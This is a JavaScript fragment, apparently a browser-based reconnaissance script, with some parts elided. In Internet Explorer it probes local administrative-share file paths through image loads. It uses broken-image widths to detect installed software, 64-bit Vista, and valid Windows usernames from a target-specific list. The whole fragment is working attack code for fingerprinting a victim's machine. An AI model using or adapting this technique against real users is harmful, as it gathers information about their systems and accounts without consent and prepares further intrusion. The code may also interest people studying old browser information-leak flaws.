function do_main(){	
    ...
    if (navigator.appName != "Microsoft Internet Explorer") {
        result = 'Client is NOT using Microsoft Internet Explorer';
    } 
    else {
        var pic1 = new Image();
        ...
        if (pic1.width == 28 && pic2.width == 28) {
            result = 'The SMB enumeration technique doesnt appear to work on target';
        }
        else {
            var working = 1;
        }
        ...
        if (working == 1) {
            var usernames = [  //enter info here based on prior info...
                "Administrator",
                "walcorn",
                "jabraham",
                "rhansen",
            ...
            for (var x = 0; x < files.length; x++) {
                ...
                if (pic1.width != 28) { //size of broken image
                    result += descriptions[x] + "\n";
                } 
                else {
                    pic1.src= "file:///\\127.0.0.1/C$/Program Files (x86)/" + files[x];
                    if (pic1.width != 28) { //size of broken image
                        result += descriptions[x] + " found\n";
                        sixtyfourbitvista = 1;
                    }
                }
            }
            document.write ("</blockquote>");
            if (sixtyfourbitvista == 1) {
                result += "Appears to be 64 bit Vista\n";
            }

            for (var x = 0; x < usernames.length; x++) {
                var pic1 = new Image();
                //possibles:
                // /Application Data/TurboMeeting/TurboMeeting/image/Accept.jpg
                // /Local Settings/Application Data/Macromedia/Flash 8/en/Configuration/HelpPanel/_sharedassets/check.gif
                // /My Documents/eFax Messenger 4.3/confidential.gif
                // /Tenable/Nessus/reports/html/images/pixel.gif
                if (sixtyfourbitvista == 1) {
                    pic1.src= "file:///\\127.0.0.1/C$/Users/" + usernames[x] + "/Local Settings/Application Data/Macromedia/Flash 8/en/Configuration/HelpPanel/_sharedassets/check.gif";
                } else {
                    pic1.src= "file:///\\127.0.0.1/C$/Documents and Settings/" + usernames[x] + "/Local Settings/Application Data/Macromedia/Flash 8/en/Configuration/HelpPanel/_sharedassets/check.gif";
                }
                if (pic1.width != 28) { //size of broken image
                    result += "Username found: " + usernames[x] + "\n"
                } 
            }
        }
    }
